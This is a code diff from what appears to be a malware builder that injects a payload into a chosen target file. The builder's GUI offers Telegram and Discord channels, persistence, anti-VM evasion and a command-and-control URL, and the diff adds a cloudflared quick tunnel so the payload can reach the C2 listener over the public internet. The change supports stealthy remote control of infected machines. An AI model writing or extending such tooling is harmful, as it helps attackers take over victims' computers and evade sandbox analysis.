-        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm = pick_gui()
+        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm, gui_tunnel = pick_gui(tunnel)
         if not host_path:
             log("[-] nothing selected")
             return 1
+        # The checkbox is authoritative once the dialog is open: --tunnel just
+        # pre-checks it. With the tunnel on, the Port field owns the listener
+        # and the public URL replaces whatever is in the C2 field.
+        tunnel = gui_tunnel
+        if tunnel:
+            port = int(load_config().get("port", port) or port)
         if gui_run:
             run_local = True
             c2_url = "http://127.0.0.1:%d/" % port
-        elif gui_c2:
+        elif gui_c2 and not tunnel:
             # Use the C2 URL from the GUI (may be public IP). The URL owns the
             # port: bind the listener where the payload will dial, not on the
             # (possibly different) number in the Port field.
@@ -2141,7 +2092,10 @@ def main():
         discord = gui_dc    # None if unchecked or empty
         persist = gui_persist
         log("[+] target (%s): %s" % (mode, host_path))
-        log("[+] C2 URL: %s" % c2_url)
+        if tunnel:
+            log("[*] C2: cloudflared quick tunnel (public URL after the listener starts)")
+        else:
+            log("[+] C2 URL: %s" % c2_url)
         if no_anti_vm:
             log("[+] Anti-VM: DISABLED (from GUI)")
         if run_local:
